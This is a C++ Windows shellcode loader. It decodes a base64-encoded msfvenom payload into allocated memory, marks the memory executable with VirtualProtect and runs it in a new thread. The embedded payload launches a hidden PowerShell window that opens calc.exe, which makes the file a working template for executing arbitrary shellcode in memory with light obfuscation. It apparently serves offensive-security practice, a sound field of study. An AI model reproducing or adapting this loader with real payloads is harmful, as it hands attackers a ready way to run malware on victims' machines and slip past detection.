
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")
using namespace std;
int DecodeBase64(const BYTE* src, unsigned int srcLen, char* dst, unsigned int dstLen) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	
	fRet = CryptStringToBinaryA( (LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE*)dst, &outLen, NULL, NULL);

	if (!fRet) outLen = 0;  // failed

	return(outLen);
}

int main() {



	DWORD oldprotect = 0;
	
	// msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp i xor/dynamic
	unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VcG93ZXJzaGVsbC5leGUgLXcgaGlkZGVuIC1jIGNhbGMuZXhlAA==";
		unsigned int calc_len = sizeof(calc_payload);





	void* exec_mem = VirtualAlloc(0, calc_len, 0x1000 | 0x2000, 0x04);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);


	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	printf("Payload Moved To memory");


	DecodeBase64((const BYTE*)calc_payload, calc_len, (char*)exec_mem, calc_len);
	//==Decode Before Execution==
	// StartExecution:
	//1 - Make the buffer executable
	BOOL rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv) {
		printf("\nShellCode Injected Succefully!\n");
	}
	//2- Creating Thread
	HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
	getchar();

	return 0;
}
